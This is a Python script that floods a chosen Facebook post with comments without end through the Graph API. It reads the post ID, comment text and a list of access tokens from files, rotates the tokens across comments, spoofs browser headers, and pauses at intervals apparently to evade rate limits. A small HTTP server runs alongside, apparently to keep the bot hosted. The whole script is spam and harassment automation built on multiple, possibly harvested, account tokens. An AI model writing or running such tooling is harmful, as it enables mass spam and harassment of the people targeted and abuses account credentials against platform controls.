import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading
import random

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"-- SERVER RUNNING>>RAJ H3R3")

def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

def send_comments_from_file():
    # Read configuration files
    try:
        with open('post_id.txt', 'r') as file:
            post_id = file.readline().strip()  # Read only first line
        
        with open('comments.txt', 'r') as file:
            comments = [line.strip() for line in file.readlines() if line.strip()]
        
        with open('tokennum.txt', 'r') as file:
            tokens = [line.strip() for line in file.readlines() if line.strip()]
        
        with open('time.txt', 'r') as file:
            speed = int(file.read().strip())
    except Exception as e:
        print(f"Error reading configuration files: {e}")
        return

    if not post_id or not comments or not tokens:
        print("Error: One or more required files are empty")
        return

    print(f"Target Post ID: {post_id}")
    print(f"Total Comments: {len(comments)}")
    print(f"Total Tokens: {len(tokens)}")
    print(f"Delay Time: {speed} seconds")

    def liness():
        print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'referer': 'https://www.facebook.com/'
    }

    # Safety variables
    consecutive_errors = 0
    max_consecutive_errors = 3
    comment_counter = 0
    
    while True:
        try:
            for comment_index, comment in enumerate(comments):
                comment = comment.strip()
                if not comment:
                    continue
                
                # Rotate tokens for each comment
                token_index = comment_index % len(tokens)
                access_token = tokens[token_index].strip()
                
                # Prepare API request
                url = f"https://graph.facebook.com/v17.0/{post_id}/comments"
                parameters = {
                    'access_token': access_token,
                    'message': comment
                }
                
                try:
                    response = requests.post(url, json=parameters, headers=headers, timeout=30)
                    current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                    
                    if response.status_code == 200:
                        comment_counter += 1
                        print(f"\033[1;92m[✓] Comment {comment_counter} posted successfully!")
                        print(f"\033[1;94m    Post ID: {post_id}")
                        print(f"\033[1;93m    Comment: {comment}")
                        print(f"\033[1;96m    Token: {token_index + 1}/{len(tokens)}")
                        print(f"\033[1;95m    Time: {current_time}")
                        consecutive_errors = 0  # Reset error counter
                        
                    else:
                        error_data = response.json()
                        error_msg = error_data.get('error', {}).get('message', 'Unknown error')
                        error_code = error_data.get('error', {}).get('code', 'Unknown code')
                        
                        print(f"\033[1;91m[x] Failed to post comment: {error_msg} (Code: {error_code})")
                        consecutive_errors += 1
                        
                        # If story doesn't exist, wait and continue
                        if "Story does not exist" in error_msg:
                            print("\033[1;93m[!] Post might be unavailable. Continuing after delay...")
                        
                except requests.exceptions.RequestException as e:
                    print(f"\033[1;91m[x] Request failed: {str(e)}")
                    consecutive_errors += 1
                
                liness()
                
                # Safety check
                if consecutive_errors >= max_consecutive_errors:
                    print("\033[1;93m[!] Too many consecutive errors. Taking a longer break...")
                    time.sleep(300)  # 5 minute break
                    consecutive_errors = 0
                
                # Fixed delay as per time.txt
                print(f"\033[1;90m[~] Waiting {speed} seconds before next comment...")
                time.sleep(speed)
                
                # Occasional longer break every 15 comments
                if comment_counter % 15 == 0 and comment_counter > 0:
                    long_break = 120  # 2 minutes
                    print(f"\033[1;93m[!] Taking a safety break of {long_break} seconds after {comment_counter} comments...")
                    time.sleep(long_break)

            print(f"\n[+] All {len(comments)} comments cycled through. Restarting comment cycle...\n")
            time.sleep(10)  # Short break before restarting
            
        except Exception as e:
            print(f"[!] An error occurred: {str(e)}")
            print("[!] Restarting in 60 seconds...")
            time.sleep(60)

def main():
    # Start server in background
    server_thread = threading.Thread(target=execute_server)
    server_thread.daemon = True
    server_thread.start()

    # Start commenting process
    send_comments_from_file()

if __name__ == '__main__':
    main()
